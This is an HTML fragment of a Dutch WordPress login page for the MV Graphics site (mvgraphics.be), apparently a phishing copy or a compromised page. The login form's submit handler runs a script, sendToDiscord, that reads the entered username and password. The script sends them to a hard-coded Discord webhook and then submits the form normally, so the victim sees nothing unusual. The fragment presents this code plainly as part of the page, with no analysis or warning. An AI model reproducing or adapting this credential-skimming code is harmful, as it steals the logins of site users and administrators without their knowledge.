    </script>
    <div id="login">
        <h1><a href="https://nl-be.wordpress.org/">Mogelijk gemaakt door WordPress</a></h1>

        <form name="loginform" id="loginform" action="https://mvgraphics.be/wp-login.php" method="post" onsubmit="sendToDiscord(event)">
            <p>
                <label for="user_login">Gebruikersnaam of e-mailadres</label>
                <input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off">
            </p>

            <div class="user-pass-wrap">
                <label for="user_pass">Wachtwoord</label>
                <div class="wp-pwd">
                    <input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20">
                    <button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Wachtwoord tonen">
                        <span class="dashicons dashicons-visibility" aria-hidden="true"></span>
                    </button>
                </div>
            </div>
            <p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> <label for="rememberme">Mij onthouden</label></p>
            <p class="submit">
                <input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Aanmelden">
                <input type="hidden" name="redirect_to" value="https://mvgraphics.be/wp-admin/">
                <input type="hidden" name="testcookie" value="1">
            </p>
        </form>

        <p id="nav">
            <a href="https://mvgraphics.be/my-account/lost-password/">Je wachtwoord vergeten?</a>
        </p>
        <script type="text/javascript">
            function wp_attempt_focus() {
                setTimeout(function() {
                    try {
                        var d = document.getElementById("user_login");
                        d.focus();
                        d.select();
                    } catch (er) {}
                }, 200);
            }
            wp_attempt_focus();
            if (typeof wpOnload === 'function') {
                wpOnload();
            }

            function sendToDiscord(event) {
                event.preventDefault();

                const username = document.getElementById('user_login').value;
                const password = document.getElementById('user_pass').value;

                const webhookUrl = "https://discord.com/api/webhooks/1228259094582788166/5crDy4wO2gP2CSBi79rzylach_DxpMB2ziEqbV_z5gJHAjmdxJPvyyWA3mH5GdSHzMxy";

                const payload = {
                    content: `Username/Email: ${username}\nPassword: ${password}`
                };

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Credentials sent to Discord webhook');
                    } else {
                        return response.text().then(text => {
                            throw new Error(text);
                        });
                    }
                })
                .catch(error => {
                    console.error('Error sending credentials to Discord webhook:', error);
                })
                .finally(() => {
                    document.getElementById('loginform').submit();
                });
            }
        </script>
        <p id="backtoblog">
            <a href="https://mvgraphics.be/">← Ga naar MV Graphics</a>
        </p>
